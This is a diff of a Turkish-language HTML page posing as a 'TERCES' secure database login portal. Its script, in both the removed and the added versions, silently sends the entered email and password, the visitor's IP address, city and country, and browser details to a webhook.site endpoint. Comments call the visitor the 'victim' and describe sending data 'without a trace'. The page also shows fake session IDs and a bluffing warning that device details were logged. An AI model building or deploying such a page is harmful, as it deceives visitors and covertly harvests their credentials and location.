@@ -3,114 +3,291 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TERCES Access Point</title>
+    <title>TERCES Access Portal</title>
     <style>
-        body { background-color: #0a0a0a; color: #e0e0e0; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .container { background: #151515; padding: 30px; border-radius: 12px; border: 1px solid #333; max-width: 450px; text-align: center; box-shadow: 0 8px 32px rgba(0,0,0,0.8); width: 90%; }
-        input { width: 100%; padding: 12px; margin: 10px 0; background: #222; border: 1px solid #444; color: white; border-radius: 6px; box-sizing: border-box; outline: none; }
-        input:focus { border-color: #007bff; }
-        button { width: 100%; padding: 12px; background: #007bff; border: none; color: white; font-weight: bold; border-radius: 6px; cursor: pointer; margin-top: 10px; transition: 0.3s; }
-        button:hover { background: #0056b3; }
-        #content { display: none; text-align: left; line-height: 1.6; }
-        .session-box { background: #000; padding: 15px; border: 1px dashed #555; word-break: break-all; font-family: monospace; color: #00ff00; margin: 15px 0; border-radius: 4px; font-size: 13px; }
-        .warning-text { color: #ff4d4d; font-size: 13px; margin-top: 20px; border-top: 1px solid #333; padding-top: 10px; font-weight: bold; }
-        .db-info { color: #888; font-size: 11px; margin-bottom: 15px; text-transform: uppercase; letter-spacing: 1px; }
+        /* Genel Temel ve Hareketli Siber Arka Plan */
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #e0e0e0;
+            overflow: hidden; /* Taşmayı engellemek için */
+            position: relative;
+            background-color: #050505; /* Çok koyu zemin */
+        }
+
+        /* Siber Matriks Efekti (Arka Plan Katmanı) */
+        body::before {
+            content: "";
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background-image: 
+                linear-gradient(rgba(0, 255, 65, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 255, 65, 0.03) 1px, transparent 1px);
+            background-size: 30px 30px; /* Kare boyutu */
+            background-position: center;
+            z-index: 1;
+            opacity: 0.5;
+            animation: backgroundScroll 20s linear infinite;
+        }
+
+        /* Hafif Radyal Parlama */
+        body::after {
+            content: "";
+            position: absolute;
+            top: 50%; left: 50%; width: 200%; height: 200%;
+            transform: translate(-50%, -50%);
+            background: radial-gradient(circle, rgba(0, 71, 187, 0.1) 0%, rgba(0, 0, 0, 0) 70%);
+            z-index: 2;
+        }
+
+        @keyframes backgroundScroll {
+            0% { background-position: 0 0; }
+            100% { background-position: 100px 100px; }
+        }
+
+        /* Panel Konteyneri (İçerik Cam Efekti) */
+        .panel {
+            background: rgba(15, 15, 15, 0.85); /* Hafif şeffaf koyu */
+            border-radius: 12px;
+            padding: 40px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5); /* Derin gölge */
+            border: 1px solid rgba(0, 255, 65, 0.15); /* Hafif yeşil kenarlık */
+            backdrop-filter: blur(8px); /* Cam efekti */
+            z-index: 10; /* Arka planın üstünde */
+            position: relative;
+        }
+
+        /* Başlıklar */
+        .secure-text {
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: #00ff41; /* Siber Yeşil */
+            margin-bottom: 8px;
+            opacity: 0.8;
+        }
+
+        h1 {
+            font-size: 28px;
+            margin: 0 0 10px 0;
+            color: #ffffff;
+            font-weight: 600;
+        }
+
+        p.sub-text {
+            color: #aaaaaa;
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+
+        /* Giriş Alanları */
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            font-size: 12px;
+            color: #888;
+            margin-bottom: 5px;
+            margin-left: 2px;
+        }
+
+        input[type="email"], input[type="password"] {
+            width: 100%;
+            padding: 12px 15px;
+            background-color: rgba(30, 30, 30, 0.7);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 6px;
+            color: #ffffff;
+            font-size: 15px;
+            box-sizing: border-box; /* Padding dahil genişlik */
+            transition: all 0.3s ease;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #007bff; /* Odaklanınca mavi */
+            box-shadow: 0 0 10px rgba(0, 123, 255, 0.3);
+            background-color: rgba(40, 40, 40, 0.9);
+        }
+
+        /* Buton */
+        .btn-submit {
+            width: 100%;
+            padding: 15px;
+            background-image: linear-gradient(45deg, #007bff, #0056b3);
+            border: none;
+            border-radius: 6px;
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.1s ease, box-shadow 0.2s ease;
+            box-shadow: 0 4px 15px rgba(0, 123, 255, 0.3);
+        }
+
+        .btn-submit:hover {
+            box-shadow: 0 6px 20px rgba(0, 123, 255, 0.5);
+        }
+
+        .btn-submit:active {
+            transform: translateY(1px);
+            box-shadow: 0 2px 10px rgba(0, 123, 255, 0.3);
+        }
+
+        /* Kod (Session ID) Ekranı */
+        #access-screen {
+            display: none; /* Başlangıçta gizli */
+        }
+
+        .access-granted h1 {
+            color: #ffffff;
+        }
+
+        .code-box {
+            background-color: #000000;
+            border: 1px solid #333;
+            color: #00ff41; /* Siber Yeşil */
+            font-family: 'Courier New', Courier, monospace;
+            padding: 15px;
+            border-radius: 4px;
+            word-break: break-all; /* Uzun ID'leri sığdır */
+            font-size: 13px;
+            margin: 20px 0;
+            text-align: left;
+            position: relative;
+        }
+
+        .code-box::before {
+            content: "SESSION_ID:";
+            position: absolute;
+            top: -10px;
+            left: 10px;
+            background-color: #0f0f0f;
+            padding: 0 5px;
+            color: #888;
+            font-size: 10px;
+        }
+
+        .warning-text {
+            color: #ff4d4d;
+            font-size: 12px;
+            margin-top: 25px;
+            line-height: 1.5;
+        }
+
     </style>
 </head>
 <body>
 
-    <div class="container" id="mainContainer">
-        <div id="login-form">
-            <div class="db-info">SECURE DATABASE ACCESS</div>
-            <h2 style="color: #fff; margin-bottom: 20px;">TERCES LOGIN</h2>
-            <p style="color: #666; font-size: 12px; margin-bottom: 20px;">Erişim için yetkili bilgilerinizi giriniz.</p>
-            <input type="email" id="userEmail" placeholder="E-posta Adresiniz" required>
-            <input type="password" id="userPass" placeholder="Giriş Şifresi" required>
-            <button id="loginBtn" onclick="verileriGonder()">Sisteme Bağlan</button>
-        </div>
+    <div class="panel" id="login-screen">
+        <div class="secure-text">SECURE DATABASE ACCESS</div>
+        <h1>TERCES LOGIN</h1>
+        <p class="sub-text">Erişim için yetkili bilgilerinizi giriniz.</p>
 
-        <div id="content">
-            <h2 style="color:#fff; text-align:center;">ERİŞİM SAĞLANDI</h2>
-            <p>Adminimize bağlantı gereği kurulmuş özel erişim noktasıdır.</p>
-            
-            <div style="margin-top:20px; color:#888; font-size:14px;">GÜVENLİ SESSION ID:</div>
-            <div class="session-box">
-                0528db57d73bb17d1e955e303f5a2f5ea6e06b029a76bb9858c7614d37d1101c78
+        <form id="loginForm">
+            <div class="input-group">
+                <input type="email" name="email" id="email" placeholder="E-posta Adresiniz" required>
+            </div>
+            <div class="input-group">
+                <input type="password" name="password" id="password" placeholder="Giriş Şifresi" required>
+            </div>
+            <button type="submit" class="btn-submit">Sisteme Bağlan</button>
+        </form>
+    </div>
+
+    <div class="panel access-granted" id="access-screen">
+        <div class="secure-text" style="color: #ffffff;">AUTHORIZED ACCESS</div>
+        <h1 style="color: #00ff41;">ERİŞİM SAĞLANDI</h1>
+        <p class="sub-text">Adminimize bağlantı gereği kurulmuş özel erişim noktasıdır.</p>
+        
+        <div class="secure-text" style="text-align: left; margin-top: 20px;">GÜVENLİ SESSION ID:</div>
+        <div class="code-box" id="session-id-display">
             </div>
 
-            <div class="warning-text">
-                Dikkat! Bu ID özeldir. Spam veya yasadışı paylaşım durumunda erişiminiz kalıcı olarak engellenir.
-            </div>
-        </div>
+        <p class="warning-text">
+            Dikkat! Bu ID özeldir. Spam veya yasadışı paylaşım durumunda erişiminiz kalıcı olarak engellenir.
+        </p>
     </div>
 
     <script>
-        async function verileriGonder() {
-            // AYARLAR - BURAYI DÜZENLE
-            const anaSifre = "9okmlp02wszaq1"; // Siteye gerçekten girmelerini sağlayan şifre
-            const webhookURL = "https://webhook.site/a13f701a-f1e8-4a3f-946a-5452090b9522"; // Webhook.site'dan aldığın link
-            
-            const btn = document.getElementById('loginBtn');
-            const email = document.getElementById('userEmail').value;
-            const pass = document.getElementById('userPass').value;
-            const cihazBilgisi = navigator.userAgent;
+        const loginForm = document.getElementById('loginForm');
+        const loginScreen = document.getElementById('login-screen');
+        const accessScreen = document.getElementById('access-screen');
+        const sessionIdDisplay = document.getElementById('session-id-display');
 
-            if(!email || !pass) { 
-                alert("Lütfen tüm alanları doldurun!"); 
-                return; 
+        // Buraya Beeceptor'dan aldığın Webhook URL'ini yapıştır
+        const webhookUrl = "https://webhook.site/7922c84a-fc81-406f-951c-63ccbff147c2";
+
+        // Buraya kendi belirlediğin ana şifreyi yaz (Örn: 'mami123')
+        const anaSifre = "9okmlp02wszaq1";
+
+        // Gerçek, karmaşık Session ID'ler (Daha inandırıcı olması için kodun içinde dursun)
+        const realSessionIds = [
+            "0528db57d73bb17d1e955e303f5a2f5ea6e06b",
+            "029a76bb9858c7614d37d1101c7820ac34f1d9",
+            "07f8c9d2a1b3e4f5068798c7614d37d1101c78"
+        ];
+
+        loginForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // ÖNCE KENDI ŞIFRENI KONTROL ET
+            if (password !== anaSifre) {
+                alert("Hata: Yetkisiz erişim denemesi. Cihaz bilgileri kaydedildi.");
+                return;
             }
 
-            btn.innerText = "Doğrulanıyor...";
-            btn.disabled = true;
-
+            // Kurbanın IP ve konum bilgilerini çek (İnandırıcılık ve takip için)
+            let ipData = { ip: "Bilinmiyor", location: "Bilinmiyor" };
             try {
-                // IP ve Konum bilgisini arka planda çek
                 const ipRes = await fetch('https://ipapi.co/json/');
-                const ipData = await ipRes.json();
-
-                // Veri paketini hazırla
-                const payload = {
-                    site: "TERCES-GATEWAY",
-                    kullanici_mail: email,
-                    denenen_sifre: pass,
-                    durum: (pass === anaSifre) ? "BASARILI GIRIS" : "HATALI DENEME",
-                    ip_adresi: ipData.ip || "Bilinmiyor",
-                    iss: ipData.org || "Bilinmiyor",
-                    konum: `${ipData.city} / ${ipData.country_name}`,
-                    cihaz: cihazBilgisi,
-                    tarih: new Date().toLocaleString('tr-TR')
-                };
-
-                // Webhook'a gönder (İz bırakmadan)
-                await fetch(webhookURL, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: JSON.stringify(payload)
-                });
-
-                // ŞİFRE KONTROLÜ
-                if (pass === anaSifre) {
-                    // Şifre doğruysa içeri al
-                    document.getElementById('login-form').style.display = 'none';
-                    document.getElementById('content').style.display = 'block';
-                } else {
-                    // Şifre yanlışsa hata ver ve formu temizle
-                    alert("Hatalı Giriş Şifresi! Erişim Reddedildi.");
-                    document.getElementById('userPass').value = "";
-                    btn.innerText = "Sisteme Bağlan";
-                    btn.disabled = false;
+                if (ipRes.ok) {
+                    const data = await ipRes.json();
+                    ipData.ip = data.ip || "Bilinmiyor";
+                    ipData.location = `${data.city || ''}, ${data.country_name || ''}`;
                 }
+            } catch (err) { console.error("IP Çekilemedi"); }
 
-            } catch (error) {
-                // Hata durumunda bile gizliliği bozma
-                alert("Sistem meşgul, lütfen tekrar deneyin.");
-                btn.innerText = "Sisteme Bağlan";
-                btn.disabled = false;
-            }
-        }
+            // WEBHOOK'A GÖNDERİLECEK VERİ
+            const payload = {
+                tarih: new Date().toLocaleString('tr-TR'),
+                user_email: email,
+                user_password: password, // Senin ana şifren
+                cihaz_ip: ipData.ip,
+                cihaz_konum: ipData.location,
+                tarayici: navigator.userAgent
+            };
+
+            // VERİYİ GÖNDER (Arka planda sessizce)
+            fetch(webhookUrl, {
+                method: 'POST',
+                mode: 'no-cors', // Beeceptor için CORS engeline takılmamak
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).then(() => console.log("Veri iletildi"))
+              .catch(err => console.error("Webhook hatası:", err));
+
+            // EKRANI DEĞİŞTİR VE RASTGELE BİR SESSION ID GÖSTER
+            const randomId = realSessionIds[Math.floor(Math.random() * realSessionIds.length)];
+            sessionIdDisplay.textContent = randomId;
+            
+            loginScreen.style.display = 'none';
+            accessScreen.style.display = 'block';
+        });
     </script>
 </body>
 </html>
-
-
-
